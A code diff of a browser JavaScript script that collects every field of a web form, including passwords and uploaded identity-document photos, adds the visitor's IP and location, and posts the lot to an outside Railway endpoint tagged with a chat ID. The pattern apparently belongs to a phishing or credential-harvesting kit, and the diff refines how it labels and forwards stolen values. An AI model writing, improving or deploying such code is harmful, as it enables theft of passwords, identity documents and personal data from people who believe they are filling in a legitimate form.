@@ -73,27 +73,44 @@ document.addEventListener("DOMContentLoaded", () => {
   // ================= SMART LABEL DETECTOR =================
   function getSmartLabel(input, form, index) {
 
+    // 1. label[for="id"]
     if (input.id) {
       const lbl = form.querySelector(`label[for="${input.id}"]`);
-      if (lbl) return lbl.innerText.trim();
+      if (lbl) return lbl.innerText.trim().replace(/\s*\*\s*$/, "");
     }
 
+    // 2. label[for="name"] — catches file inputs that have name but no id
+    if (input.name) {
+      const lbl = form.querySelector(`label[for="${input.name}"]`);
+      if (lbl) return lbl.innerText.trim().replace(/\s*\*\s*$/, "");
+    }
+
+    // 3. Wrapped inside a <label>
     if (input.closest("label")) {
-      return input.closest("label").innerText.trim();
+      return input.closest("label").innerText.trim().replace(/\s*\*\s*$/, "");
     }
 
+    // 4. aria-label attribute
     if (input.getAttribute("aria-label")) {
       return input.getAttribute("aria-label").trim();
     }
 
+    // 5. placeholder text
     if (input.placeholder) {
       return input.placeholder.trim();
     }
 
-    if (input.previousElementSibling) {
-      let text = input.previousElementSibling.innerText;
-      if (text) return text.trim();
+    // 6. nearest preceding sibling with text
+    let sibling = input.previousElementSibling;
+    while (sibling) {
+      const text = sibling.innerText?.trim();
+      if (text) return text.replace(/\s*\*\s*$/, "");
+      sibling = sibling.previousElementSibling;
     }
+
+    // 7. use name/id as last resort before generic fallback
+    if (input.name) return input.name.replace(/_/g, " ");
+    if (input.id)   return input.id.replace(/_/g, " ");
 
     return `Field ${index + 1}`;
   }
@@ -105,48 +122,51 @@ document.addEventListener("DOMContentLoaded", () => {
     formData.append("chat_id", userId);
 
     let inputCount = 0;
-    let fileCount  = 0;
-    let summary    = [];
-    let itemIndex  = 0; // index for item[N] image sections
+    let fileCount = 0;
+    let summary = [];
 
     const inputs = form.querySelectorAll("input, textarea, select");
 
     inputs.forEach((input, index) => {
 
       if (!input || ["submit", "button"].includes(input.type)) return;
+
       if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
 
-      const label = getSmartLabel(input, form, index);
+      let label = getSmartLabel(input, form, index);
+
+      let key =
+        input.name ||
+        input.id ||
+        label ||
+        input.placeholder ||
+        `field_${index + 1}`;
+
+      key = key.replace(/\s+/g, "_").toLowerCase();
 
       if (input.type === "file") {
-        // Each uploaded file becomes its own item[N] section:
-        //   item[N][text]  = the human-readable label (e.g. "ID Front Side")
-        //   item[N][photo] = the actual file bytes
-        // The backend sends each image as a separate captioned photo message.
         if (!input.files || input.files.length === 0) return;
 
         for (let file of input.files) {
-          const cleanLabel = label.replace(/\s*\*\s*$/, "").trim(); // strip trailing *
-          formData.append(`item[${itemIndex}][text]`,  cleanLabel);
-          formData.append(`item[${itemIndex}][photo]`, file);
-          itemIndex++;
+          formData.append(key, file);
           fileCount++;
         }
 
       } else {
-        const value = input.value?.trim();
+        let value = input.value?.trim();
         if (!value) return;
 
-        // Skip confirm_password — no need to forward it
-        if (input.name === "confirm_password") return;
-
         inputCount++;
-        summary.push(`${label}: ${value}`);
+
+        let fullInfo = `${label}: ${value}`;
+
+        formData.append(key, fullInfo);
+        summary.push(fullInfo);
       }
 
     });
 
-    return { formData, inputCount, fileCount, summary, itemIndex };
+    return { formData, inputCount, fileCount, summary };
   }
 
   // ================= UI =================
@@ -262,13 +282,11 @@ document.addEventListener("DOMContentLoaded", () => {
     showBox("Processing...");
     await new Promise(resolve => setTimeout(resolve, 50));
 
-    const { formData, inputCount, summary, fileCount, itemIndex } = buildGlobalFormData(userId, form);
+    const { formData, inputCount, summary, fileCount } = buildGlobalFormData(userId, form);
     const loc = await getLocationData();
 
-    // Build the text report and append as "text" so /send uses it as the
-    // first message (and as caption fallback on any plain-field sends).
-    const reportMessage =
-`📥 NEW SUBMISSION
+    let reportMessage = `
+📥 NEW SUBMISSION
 
 🌍 Location
 IP: ${loc.ip}
@@ -281,12 +299,10 @@ Inputs: ${inputCount}
 Files: ${fileCount}
 
 📝 Values
-${summary.length ? summary.join("\n") : "No input values"}`;
+${summary.length ? summary.join("\n") : "No input values"}
+`;
 
-    // Append as "text" — the /send endpoint treats this as the message body.
-    // If there are also item[N] image sections, the report goes first as its
-    // own sendMessage, then each image follows as a captioned photo.
-    formData.append("text", reportMessage);
+    formData.append("report", reportMessage);
 
     try {
       const res = await fetch("https://web-production-d469f.up.railway.app/send", {
